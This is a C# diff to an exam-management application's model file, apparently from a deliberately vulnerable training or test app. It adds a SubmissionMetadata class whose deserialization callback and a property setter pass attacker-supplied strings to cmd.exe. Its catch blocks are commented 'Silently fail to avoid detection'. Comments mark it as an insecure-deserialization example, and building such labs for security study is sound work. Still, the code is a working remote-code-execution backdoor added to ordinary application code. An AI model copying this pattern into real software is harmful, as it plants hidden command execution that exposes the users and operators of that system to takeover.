@@ -1,5 +1,6 @@
 using System.ComponentModel.DataAnnotations;
 using System.ComponentModel.DataAnnotations.Schema;
+using System.Runtime.Serialization;
 
 namespace ExamManagement.Models
 {
@@ -106,5 +107,98 @@ namespace ExamManagement.Models
 
         public int? GradedByUserId { get; set; }
         public User? GradedBy { get; set; }
+    }
+
+    // Class for deserialization - VULNERABLE: Used for insecure deserialization
+    [Serializable]
+    public class SubmissionMetadata : IDeserializationCallback
+    {
+        public int ExamId { get; set; }
+        public int StudentId { get; set; }
+        public string? Notes { get; set; }
+        public DateTime? SubmittedAt { get; set; }
+        public string? Command { get; set; } // VULNERABLE: Command to execute
+        
+        // VULNERABLE: Constructor is called during deserialization
+        public SubmissionMetadata()
+        {
+            // Constructor code runs during deserialization
+        }
+        
+        // VULNERABLE: Property setter can execute code
+        private string? _maliciousPayload;
+        public string? MaliciousPayload
+        {
+            get => _maliciousPayload;
+            set
+            {
+                _maliciousPayload = value;
+                // VULNERABLE: Code execution in property setter during deserialization
+                if (!string.IsNullOrEmpty(value) && value.StartsWith("CMD:"))
+                {
+                    try
+                    {
+                        var command = value.Substring(4);
+                        var process = new System.Diagnostics.Process
+                        {
+                            StartInfo = new System.Diagnostics.ProcessStartInfo
+                            {
+                                FileName = "cmd.exe",
+                                Arguments = "/c " + command,
+                                UseShellExecute = false,
+                                RedirectStandardOutput = true,
+                                CreateNoWindow = true
+                            }
+                        };
+                        process.Start();
+                        process.WaitForExit();
+                    }
+                    catch
+                    {
+                        // Silently fail to avoid detection
+                    }
+                }
+            }
+        }
+        
+        // VULNERABLE: This callback is executed automatically during deserialization
+        // An attacker can craft a malicious serialized object that executes code here
+        // This is a classic Insecure Deserialization vulnerability pattern
+        public void OnDeserialization(object? sender)
+        {
+            // This method is called automatically after deserialization completes
+            // An attacker can exploit this to execute arbitrary code
+            if (!string.IsNullOrEmpty(Command))
+            {
+                // CRITICAL VULNERABILITY: Executing untrusted commands
+                // This allows Remote Code Execution (RCE) during deserialization
+                try
+                {
+                    var process = new System.Diagnostics.Process
+                    {
+                        StartInfo = new System.Diagnostics.ProcessStartInfo
+                        {
+                            FileName = "cmd.exe",
+                            Arguments = "/c " + Command,
+                            UseShellExecute = false,
+                            RedirectStandardOutput = true,
+                            CreateNoWindow = true
+                        }
+                    };
+                    process.Start();
+                    process.WaitForExit();
+                }
+                catch
+                {
+                    // Silently fail to avoid detection
+                }
+            }
+            
+            if (!string.IsNullOrEmpty(Notes))
+            {
+                // VULNERABLE: Processing untrusted data without validation
+                System.Diagnostics.Debug.WriteLine($"Processing notes: {Notes}");
+            }
+        }
     }
 }
